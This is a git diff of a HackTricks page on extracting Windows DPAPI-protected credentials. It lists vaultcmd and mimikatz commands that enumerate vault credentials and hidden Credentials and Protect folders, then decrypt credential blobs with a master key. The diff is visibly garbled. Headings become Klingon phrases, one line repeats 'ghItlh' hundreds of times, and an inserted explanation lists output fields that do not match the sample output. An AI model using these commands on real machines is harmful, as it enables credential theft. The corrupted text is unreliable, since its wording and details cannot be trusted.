@@ -2,7 +2,7 @@
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>!HackTricks</strong></a><strong>!</strong></summary>
 
 * Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
 * Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
@@ -35,7 +35,6 @@ Among the personal data protected by DPAPI are:
 
 
 ## List Vault
-
 ```bash
 # From cmd
 vaultcmd /listcreds:"Windows Credentials" /all
@@ -43,20 +42,33 @@ vaultcmd /listcreds:"Windows Credentials" /all
 # From mimikatz
 mimikatz vault::list
 ```
+## qaw'wI' yIghuS
 
-## Credential Files
-
-The **credentials files protected** could be located in:
-
+**qaw'wI' yIghuS** credentials files **qaw'wI' yIghuS** could be located in:
 ```
 dir /a:h C:\Users\username\AppData\Local\Microsoft\Credentials\
 dir /a:h C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Local\Microsoft\Credentials\
 Get-ChildItem -Hidden C:\Users\username\AppData\Roaming\Microsoft\Credentials\
 ```
+# dpapi::cred
 
-Get credentials info using mimikatz `dpapi::cred`, in the response you can find interesting info such as the encrypted data and the guidMasterKey.
+`dpapi::cred` is a command in Mimikatz that allows you to extract credentials information from the Data Protection API (DPAPI) on Windows systems. When executed, this command provides valuable information such as the encrypted data and the `guidMasterKey`.
 
+To use this command, follow these steps:
+
+1. Launch Mimikatz with administrative privileges.
+2. Execute the `dpapi::cred` command.
+
+The response will contain the following information:
+
+- `Domain`: The domain associated with the credentials.
+- `User`: The username associated with the credentials.
+- `Password`: The encrypted password.
+- `Sid`: The Security Identifier (SID) of the user.
+- `MasterKey`: The `guidMasterKey` associated with the credentials.
+
+By extracting this information, you can gain insights into the encrypted passwords and the corresponding master keys, which can be useful for further analysis and privilege escalation techniques.
 ```bash
 mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\28350839752B38B238E5D56FDD7891A7
 
@@ -66,17 +78,13 @@ guidMasterKey      : {3e90dd9e-f901-40a1-b691-84d7f647b8fe}
 pbData             : b8f619[...snip...]b493fe
 [..]
 ```
-
-You can use **mimikatz module** `dpapi::cred` with the appropiate `/masterkey` to decrypt:
-
+**mimikatz module** `dpapi::cred` **nuqneH** `/masterkey` **vaj** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **ghItlh** **
 ```
 dpapi::cred /in:C:\path\to\encrypted\file /masterkey:<MASTERKEY>
 ```
-
 ## Master Keys
 
-The DPAPI keys used for encrypting the user's RSA keys are stored under `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [**Security Identifier**](https://en.wikipedia.org/wiki/Security\_Identifier) **of that user**. **The DPAPI key is stored in the same file as the master key that protects the users private keys**. It usually is 64 bytes of random data. (Notice that this directory is protected so you cannot list it using`dir` from the cmd, but you can list it from PS).
-
+**DPAPI** keys used for encrypting the user's RSA keys are stored under the `%APPDATA%\Microsoft\Protect\{SID}` directory, where {SID} is the [**Security Identifier**](https://en.wikipedia.org/wiki/Security_Identifier) **of that user**. **The DPAPI key is stored in the same file as the master key that protects the user's private keys**. It usually consists of 64 bytes of random data. (Notice that this directory is protected, so you cannot list it using `dir` from the cmd, but you can list it from PS).
 ```bash
 Get-ChildItem C:\Users\USER\AppData\Roaming\Microsoft\Protect\
 Get-ChildItem C:\Users\USER\AppData\Local\Microsoft\Protect
@@ -85,7 +93,6 @@ Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\
 Get-ChildItem -Hidden C:\Users\USER\AppData\Roaming\Microsoft\Protect\{SID}
 Get-ChildItem -Hidden C:\Users\USER\AppData\Local\Microsoft\Protect\{SID}
 ```
-
 This is what a bunch of Master Keys of a user will looks like:
 
 ![](<../../.gitbook/assets/image (324).png>)
